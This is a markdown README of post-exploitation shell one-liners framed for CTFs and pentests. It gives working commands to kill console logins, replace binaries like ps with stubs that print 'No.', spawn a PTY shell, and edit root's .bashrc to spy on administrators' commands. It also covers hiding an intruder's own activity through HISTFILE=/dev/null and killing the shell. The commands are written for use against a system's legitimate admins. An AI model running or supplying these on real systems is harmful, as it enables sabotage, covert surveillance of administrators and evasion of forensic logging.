Handy Commands
==============
This is a collection of commands I've found useful in CTFs and the like.  Some
of them are useful in pentests, some should never be used in a professional
environment.  Please don't use them for illegal purposes.

1. [Kill console logins](#kill-console-logins)
2. [Dork Binaries to say "No."](#dork-binaries-to-say-no)
3. [Spawn a PTY with Python](#spawn-a-pty-with-python)
4. [Make Bash Log History Immediately](#make-bash-log-history-immediately)

Kill Console Logins
-------------------
Kills login processes attached to the console.  Useful for annoying admins who
don't use SSH.
```sh
ps ax | grep login | perl -pe '`kill $1` if /(\d+) tty/'
```

Dork Binaries to say "No."
--------------------------
Make the output of a command "No."

Useful for when pesky admins actually want to do something like list processes.
The old binary is preserved, of course.

One-liner:
```sh
export C=ps; export B=$(which $C); cp $B ${B}.bak && echo '#!/bin/sh' > ${B}.no && echo 'echo "No."' >> ${B}.no && rm $B && ln -s ${B}.no $B
```

Multiline:
```sh
C=ps # Command to dork
B=$(which $C)
cp $B ${B}.bak
echo '#!/bin/sh' > ${B}.no
echo 'echo "No."' >> ${B}.no
rm $B && ln -s ${B}.no $B
```

Spawn a PTY with Python
-----------------------
Sudo needs a tty (or pty).  The `/bin/sh` trick doesn't give you one.
Solution:
```sh
python -c 'import pty; pty.spawn("/bin/sh")'
```

Make Bash Log History Immediately
---------------------------------
By default, Bash logs history when it exits.  To watch what the admins are
up to, add the following to their `.bashrc` files.
```sh
shopt -s histappend
PROMPT_COMMAND="history -a;$PROMPT_COMMAND"
```
Then `tail -f /root/.bash_history` as appropriate.

One-liner:
```sh
echo 'shopt -s histappend' >> /root/.bashrc && echo 'PROMPT_COMMAND="history -a;$PROMPT_COMMAND"' >> /root/.bashrc
```

Of course, to stay out of root's `.bash_history` while you're poking around,
you should probably do something along the lines of `export HISTFILE=/dev/null`
and remember to `kill -9 $$` for just in case.  Better yet, don't use bash.
